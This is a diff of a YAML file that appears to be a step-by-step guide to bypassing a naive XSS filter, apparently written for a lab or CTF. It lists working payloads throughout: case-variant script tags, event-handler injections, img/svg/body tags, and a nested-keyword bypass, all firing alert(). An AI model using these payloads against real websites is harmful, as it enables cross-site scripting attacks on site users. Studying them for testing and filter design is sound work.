@@ -14,7 +14,7 @@ tricks:
     payload: |
       # Vulnerable code pattern:
       # msg = re.sub(r"script", "", msg)  # Only removes lowercase
-      
+
       # Test: input 'script' -> gets removed
       # Test: input 'SCRIPT' -> passes through
 
@@ -24,10 +24,10 @@ tricks:
     payload: |
       # Uppercase bypass:
       "><SCRIPT>alert('XSS')</SCRIPT>
-      
+
       # Mixed case bypass:
       "><ScRiPt>alert('XSS')</ScRiPt>
-      
+
       # Result: value=""><SCRIPT>alert('XSS')</SCRIPT>"
 
   - name: "Step 3: Alternative - Event handlers"
@@ -36,10 +36,10 @@ tricks:
     payload: |
       # onfocus with autofocus:
       " onfocus=alert('XSS') autofocus="
-      
+
       # onmouseover:
       " onmouseover=alert('XSS') x="
-      
+
       # onclick:
       " onclick=alert('XSS') x="
 
@@ -49,10 +49,10 @@ tricks:
     payload: |
       # img tag with onerror:
       "><img src=x onerror=alert('XSS')>
-      
+
       # svg tag with onload:
       "><svg onload=alert('XSS')>
-      
+
       # body tag with onload:
       "><body onload=alert('XSS')>
 
@@ -62,6 +62,5 @@ tricks:
     payload: |
       # If 'script' is removed once:
       # scrscriptipt -> scr[removed]ipt -> script
-      
-      "><scrscriptipt>alert('XSS')</scrscriptipt>
 
+      "><scrscriptipt>alert('XSS')</scrscriptipt>
